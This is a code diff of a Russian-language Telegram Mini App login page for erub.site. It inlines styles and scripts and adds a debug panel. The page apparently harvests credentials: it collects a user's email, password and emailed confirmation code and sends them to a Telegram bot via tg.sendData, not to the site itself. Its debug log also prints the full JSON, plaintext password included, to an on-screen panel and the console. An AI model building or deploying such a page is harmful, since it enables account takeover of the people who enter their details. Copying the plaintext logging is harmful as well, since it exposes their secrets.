@@ -5,7 +5,171 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Вход в erub.site</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <link rel="stylesheet" href="style.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .logo h1 {
+            font-size: 28px;
+            color: #333;
+        }
+        .logo p {
+            color: #666;
+            font-size: 14px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #555;
+            font-weight: 500;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+        .form-group input:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+        .btn-primary {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 10px;
+        }
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
+        }
+        .btn-primary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        .btn-support {
+            width: 100%;
+            padding: 12px;
+            background: #f5f5f5;
+            color: #333;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .btn-support:hover {
+            background: #e8e8e8;
+        }
+        .message {
+            margin-top: 20px;
+            padding: 12px;
+            border-radius: 10px;
+            display: none;
+            text-align: center;
+        }
+        .message.success {
+            display: block;
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        .message.error {
+            display: block;
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        .message.info {
+            display: block;
+            background: #d1ecf1;
+            color: #0c5460;
+            border: 1px solid #bee5eb;
+        }
+        .footer {
+            margin-top: 20px;
+        }
+        #codeForm {
+            margin-top: 20px;
+        }
+        /* Отладочная панель */
+        .debug-panel {
+            margin-top: 20px;
+            padding: 10px;
+            background: #f8f9fa;
+            border-radius: 10px;
+            font-size: 12px;
+            color: #333;
+            max-height: 150px;
+            overflow-y: auto;
+            display: none;
+            border: 1px solid #dee2e6;
+        }
+        .debug-panel.show {
+            display: block;
+        }
+        .debug-panel .log-entry {
+            padding: 3px 0;
+            border-bottom: 1px solid #eee;
+            font-family: monospace;
+        }
+        .debug-panel .log-entry.error {
+            color: #dc3545;
+        }
+        .debug-panel .log-entry.success {
+            color: #28a745;
+        }
+        .debug-panel .log-entry.info {
+            color: #007bff;
+        }
+        .debug-toggle {
+            margin-top: 10px;
+            padding: 5px 10px;
+            font-size: 12px;
+            background: #6c757d;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+    </style>
 </head>
 <body>
     <div class="container">
@@ -14,20 +178,18 @@
             <p>Вход в систему</p>
         </div>
         
-        <div class="form" id="loginForm">
+        <div id="loginForm">
             <div class="form-group">
                 <label for="email">📧 Email</label>
-                <input type="email" id="email" placeholder="Введите ваш email" required>
+                <input type="email" id="email" placeholder="Введите ваш email">
             </div>
             
             <div class="form-group">
                 <label for="password">🔑 Пароль</label>
-                <input type="password" id="password" placeholder="Введите пароль" required>
+                <input type="password" id="password" placeholder="Введите пароль">
             </div>
             
-            <button type="submit" id="submitBtn" class="btn-primary">
-                Войти
-            </button>
+            <button id="submitBtn" class="btn-primary">Войти</button>
         </div>
 
         <div id="codeForm" style="display: none;">
@@ -35,20 +197,158 @@
                 <label for="codeInput">📧 Код подтверждения</label>
                 <input type="text" id="codeInput" placeholder="Введите код с почты">
             </div>
-            <button id="submitCodeBtn" class="btn-primary">
-                Подтвердить код
-            </button>
+            <button id="submitCodeBtn" class="btn-primary">Подтвердить код</button>
         </div>
 
         <div id="message" class="message"></div>
         
         <div class="footer">
-            <button onclick="openSupport()" class="btn-support">
-                🆘 Техническая поддержка
-            </button>
+            <button onclick="openSupport()" class="btn-support">🆘 Техническая поддержка</button>
+            <button onclick="toggleDebug()" class="debug-toggle">🐛 Показать отладку</button>
+        </div>
+        
+        <!-- Отладочная панель -->
+        <div id="debugPanel" class="debug-panel">
+            <div id="debugLogs"></div>
         </div>
     </div>
     
-    <script src="script.js"></script>
+    <script>
+        // Отладочная функция
+        function debugLog(message, type = 'info') {
+            const panel = document.getElementById('debugPanel');
+            const logs = document.getElementById('debugLogs');
+            
+            panel.classList.add('show');
+            
+            const entry = document.createElement('div');
+            entry.className = `log-entry ${type}`;
+            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            logs.appendChild(entry);
+            
+            // Автоскролл
+            panel.scrollTop = panel.scrollHeight;
+            
+            console.log(message);
+        }
+        
+        function toggleDebug() {
+            const panel = document.getElementById('debugPanel');
+            panel.classList.toggle('show');
+        }
+        
+        // Очищаем логи при загрузке
+        document.getElementById('debugLogs').innerHTML = '';
+        
+        // Инициализация
+        document.addEventListener('DOMContentLoaded', function() {
+            debugLog('📱 Mini App загружен', 'info');
+            
+            if (typeof window.Telegram === 'undefined') {
+                debugLog('❌ Telegram WebApp НЕ НАЙДЕН!', 'error');
+                return;
+            }
+            
+            const tg = window.Telegram.WebApp;
+            tg.expand();
+            debugLog('✅ WebApp инициализирован', 'success');
+            
+            const emailInput = document.getElementById('email');
+            const passwordInput = document.getElementById('password');
+            const codeInput = document.getElementById('codeInput');
+            const submitBtn = document.getElementById('submitBtn');
+            const submitCodeBtn = document.getElementById('submitCodeBtn');
+            const messageDiv = document.getElementById('message');
+            const loginForm = document.getElementById('loginForm');
+            const codeForm = document.getElementById('codeForm');
+            
+            function showMessage(text, type = 'info') {
+                messageDiv.textContent = text;
+                messageDiv.className = `message ${type}`;
+                messageDiv.style.display = 'block';
+                debugLog(`📢 ${text}`, type);
+                setTimeout(() => {
+                    messageDiv.style.display = 'none';
+                }, 5000);
+            }
+            
+            // ОТПРАВКА ДАННЫХ
+            submitBtn.addEventListener('click', function() {
+                const email = emailInput.value.trim();
+                const password = passwordInput.value.trim();
+                
+                debugLog(`🔘 Кнопка Войти нажата`, 'info');
+                debugLog(`📧 Email: ${email}`, 'info');
+                debugLog(`🔑 Пароль: ${password ? '****' : 'пусто'}`, 'info');
+                
+                if (!email || !password) {
+                    showMessage('Заполните все поля', 'error');
+                    return;
+                }
+                
+                const data = {
+                    email: email,
+                    password: password
+                };
+                
+                const jsonData = JSON.stringify(data);
+                debugLog(`📤 Отправляем: ${jsonData}`, 'info');
+                
+                try {
+                    // ПРОВЕРЯЕМ, ЕСТЬ ЛИ sendData
+                    if (typeof tg.sendData === 'function') {
+                        tg.sendData(jsonData);
+                        debugLog('✅ Данные отправлены через tg.sendData()', 'success');
+                        showMessage('✅ Данные отправлены!', 'success');
+                        
+                        // Очищаем поля
+                        emailInput.value = '';
+                        passwordInput.value = '';
+                    } else {
+                        debugLog('❌ tg.sendData() НЕ ДОСТУПЕН!', 'error');
+                        showMessage('❌ Ошибка: sendData не доступен', 'error');
+                    }
+                } catch (error) {
+                    debugLog(`❌ Ошибка: ${error.message}`, 'error');
+                    showMessage('❌ Ошибка отправки', 'error');
+                }
+            });
+            
+            // Отправка кода
+            submitCodeBtn.addEventListener('click', function() {
+                const code = codeInput.value.trim();
+                if (!code) {
+                    showMessage('Введите код', 'error');
+                    return;
+                }
+                
+                const jsonData = JSON.stringify({ code: code });
+                debugLog(`📤 Отправляем код: ${jsonData}`, 'info');
+                
+                try {
+                    tg.sendData(jsonData);
+                    debugLog('✅ Код отправлен', 'success');
+                    showMessage('✅ Код отправлен!', 'success');
+                    codeInput.value = '';
+                } catch (error) {
+                    debugLog(`❌ Ошибка: ${error.message}`, 'error');
+                    showMessage('❌ Ошибка отправки', 'error');
+                }
+            });
+            
+            // Проверка sendData при загрузке
+            if (typeof tg.sendData === 'function') {
+                debugLog('✅ tg.sendData() доступен', 'success');
+                showMessage('✅ Бот готов к работе', 'success');
+            } else {
+                debugLog('❌ tg.sendData() НЕ ДОСТУПЕН!', 'error');
+                showMessage('❌ Ошибка: Mini App не инициализирован', 'error');
+            }
+        });
+        
+        function openSupport() {
+            window.open('https://t.me/potok457', '_blank');
+        }
+    </script>
 </body>
 </html>
